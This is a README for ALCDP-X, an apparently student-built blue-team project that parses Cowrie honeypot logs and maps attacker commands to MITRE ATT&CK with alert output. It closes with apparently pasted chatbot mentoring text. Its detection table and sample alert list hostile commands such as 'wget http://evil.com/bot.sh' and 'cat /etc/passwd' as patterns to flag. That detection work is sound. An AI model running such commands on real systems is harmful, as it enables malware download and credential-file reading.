# ALCDP‑X  
### Autonomous Linux Compromise Detection & Response Platform

ALCDP‑X is a **blue‑team focused security platform** that detects, classifies, and responds to Linux system compromises using **honeypot telemetry, MITRE ATT&CK mapping, and automated alerting**.

This project is designed to simulate **real SOC detection pipelines**, not toy scripts.

---

## 🚀 Core Objectives

- Parse real **Cowrie honeypot logs**
- Detect attacker behavior from command input
- Classify attacks using **MITRE ATT&CK**
- Assign severity levels automatically
- Trigger alerts for high‑risk activity
- Lay the foundation for **autonomous response**

---

## 🧠 Architecture Overview

Cowrie Honeypot Logs
↓
Parser Engine (cowrie_parser.py)
↓
Detection Rules (rules.py)
↓
Alert Manager
↓
[ Future ] Automated Response (Firewall / Isolation)


---

## 📁 Project Structure

alcdp-x/
├── alerts/
│ └── alert_manager.py # Alert generation & logging
├── detections/
│ └── rules.py # Detection & MITRE mapping logic
├── logs/
│ └── cowrie.json # Cowrie honeypot logs
├── parser/
│ └── cowrie_parser.py # Core parsing engine
├── reports/
│ └── alerts.log # Alert records
├── response/
│ └── firewall.py # (Planned) Automated response
├── state/
│ ├── alert_cache.json
│ └── blocked_ips.json
└── README.md


---

## 🔍 Detection Logic

ALCDP‑X uses **regex‑based behavioral detection** instead of static signatures.

### Example Detection Rules

| Attack Type | Command Example | Severity | MITRE |
|------------|----------------|----------|-------|
| Reconnaissance | `uname -a`, `whoami` | LOW | T1082 |
| Malware Download | `wget http://evil.com/bot.sh` | CRITICAL | T1105 |
| Privilege Escalation | `sudo -l`, `su root` | HIGH | T1548 |
| File Enumeration | `cat /etc/passwd` | MEDIUM | T1083 |

---

## 🚨 Alerting System

Alerts are generated automatically for **HIGH** and **CRITICAL** severity events.

Example alert output:

🚨 ALERT GENERATED 🚨
Time : 2026-01-29T19:21:03Z
SourceIP : 127.0.0.1
Session : cffada91888a
Command : wget http://evil.com/bot.sh
Type : MALWARE_DOWNLOAD
Severity : CRITICAL
MITRE : T1105


---

## 🧪 How to Run

### Prerequisites
- Linux (tested on Kali)
- Python 3.10+
- Cowrie honeypot logs

### Run the Parser
```bash
cd alcdp-x
python3 -m parser.cowrie_parser
🛡️ Current Capabilities
✅ Honeypot log parsing
✅ MITRE ATT&CK mapping
✅ Severity classification
✅ Alert generation
✅ Modular detection engine

🔮 Planned Features
Session‑based attack correlation

Kill‑chain detection (Recon → Download → Priv‑Esc)

Automated firewall blocking

AI‑assisted anomaly detection

Dashboard & reporting

Multi‑honeypot support

🎯 Use Cases
SOC training & simulation

Blue‑team skill development

Honeypot telemetry analysis

Cybersecurity research

Resume‑grade security project

⚠️ Disclaimer
This project is intended for defensive security research and education only.
Do NOT deploy on production systems without proper hardening and review.

👤 Author
Hrudyansh Kayastha
Cybersecurity | Linux Defense | Blue Team
GitHub: https://github.com/hrudyansh009

⭐ Final Note
ALCDP‑X is built to think like a defender, not just detect strings.
This is a foundation for autonomous cyber defense — not a toy IDS.


---

### Brutally honest feedback
This README is **good enough for recruiters and GitHub judges**.  
Not overhyped. Not fake. Technically accurate.

### Next mentor step
After README:
1. Add **attack chain correlation**
2. Implement **automatic IP blocking**
3. Add **one diagram** (PNG) for architecture

Say **“README added”** when done — then we move to **behavioral correlation**, the real fun part.
::contentReference[oaicite:0]{index=0}
